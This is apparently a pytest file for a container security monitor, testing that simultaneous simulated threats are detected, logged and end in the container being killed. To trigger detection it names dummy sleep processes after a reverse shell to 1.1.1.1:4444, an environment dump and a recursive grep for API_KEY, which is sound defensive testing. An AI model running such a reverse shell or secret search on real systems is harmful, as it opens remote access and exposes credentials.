"""Test handling of multiple simultaneous threats."""

import subprocess
import time

import pytest

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_multiple_simultaneous_threats(test_workspace, enable_monitoring, coi_binary):
    """Test that multiple threats are all detected and logged."""
    proc = subprocess.Popen(
        [
            coi_binary,
            "shell",
            "--workspace",
            test_workspace,
            "--slot",
            "20",
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-20"

    if not wait_for_container_running(container_name, timeout=30):
        proc.terminate()
        pytest.skip(f"Container {container_name} not found or not running")

    # Wait for monitoring baseline to stabilize
    time.sleep(10)

    # Inject multiple threats simultaneously
    # Threat 1: Reverse shell (CRITICAL)
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Threat 2: Environment scanning (WARNING)
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'printenv' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Threat 3: API key search (WARNING)
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'grep -r API_KEY /workspace' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Wait for monitoring to detect all threats
    time.sleep(5)

    # Container should be killed (CRITICAL takes precedence)
    killed = False
    for _ in range(15):
        time.sleep(1)
        state = get_container_state(container_name)
        if container_absent(container_name):
            killed = True
            break

    assert killed, (
        f"Container should be killed (stopped AND deleted) when CRITICAL threat present (final observed state: {state!r})"
    )

    # Verify all threats are logged
    events = get_threat_events(container_name)

    # Should have CRITICAL threat(s)
    critical = [e for e in events if e.get("level") == "critical"]
    assert len(critical) > 0, "Expected at least one CRITICAL threat"

    # May have WARNING threats too (depending on timing)
    # Don't assert on warnings count - they may or may not be detected before kill

    # Verify total events captured
    assert len(events) >= 1, "Expected at least one threat event"

    proc.terminate()
    cleanup_container(container_name, coi_binary)
